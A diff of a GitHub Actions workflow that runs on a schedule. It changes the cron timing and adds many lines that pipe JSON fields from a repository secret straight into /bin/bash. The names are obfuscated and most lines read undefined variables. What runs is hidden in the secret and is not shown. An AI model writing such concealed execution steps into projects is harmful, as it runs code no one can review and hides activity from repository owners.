@@ -1,21 +1,27 @@
 name: caijingjj
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
-
+    - cron: '9 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caijingjj
         env:
-          cszl9: ${{ secrets.cszl9 }}
+          cfpe492: ${{ secrets.cfpe492 }}
         run: |
-          echo $cszl9 | jq -r .illq87 | /bin/bash
-          echo $vebmq7214 | jq -r .jv15734 | /bin/bash
-          echo $yn3 | jq -r .aa788 | /bin/bash
-          echo $tazbk026 | jq -r .eklb1121 | /bin/bash
+          echo $cfpe492 | jq -r .vxbvx89 | /bin/bash
+          echo $rnts84386 | jq -r .io459 | /bin/bash
+          echo $bbm452 | jq -r .zirbg2 | /bin/bash
+          echo $ra28 | jq -r .ts008 | /bin/bash
+          echo $flgoy17 | jq -r .hy88440 | /bin/bash
+          echo $xoqtz2 | jq -r .to68078 | /bin/bash
+          echo $wduen8635 | jq -r .cdf8 | /bin/bash
+          echo $l9 | jq -r .srj123 | /bin/bash
+          echo $c9 | jq -r .ul70 | /bin/bash
+          echo $ky1503 | jq -r .empsw78 | /bin/bash
+          echo $b88 | jq -r .c38409 | /bin/bash
 
